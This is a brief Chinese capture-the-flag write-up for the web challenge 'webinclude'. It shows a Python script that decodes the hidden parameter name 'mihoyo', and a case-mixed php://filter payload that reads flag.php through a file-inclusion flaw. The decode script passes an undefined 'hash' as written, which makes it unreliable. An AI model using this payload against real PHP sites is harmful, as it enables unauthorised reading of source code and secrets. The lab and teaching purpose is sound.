## webinclude


***

出题人：mikannse

![image-20240413223225849](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413223225849.png)

访问得到需要参数，存在index.bak文件，下载查看。存在两个函数，并且利用这两个函数将参数名进行加密，加密后的hash值为dxdydxdudxdtdxeadxekdxea

编写解密脚本：

```python
def textToarray(hash):
    array =[]
    for c in hash:
        code = ord(c)
        array.append(code-97)
    return array


def arrayTostring(array):
    string=''
    for i in range(0,len(array),2) :
        string+= chr(array[i]*26+array[i+1])
    return string

if __name__ == '__main__':
    print (arrayTostring((textToarray((arrayTostring((textToarray(hash))))))))

```

解得参数名为mihoyo,而且存在文件包含漏洞，并且当前目录存在一个flag.php,利用伪协议读取得到flag

```
?mihoyo=pHp://FilTer/convert.base64-encode/resource=flag.php

```





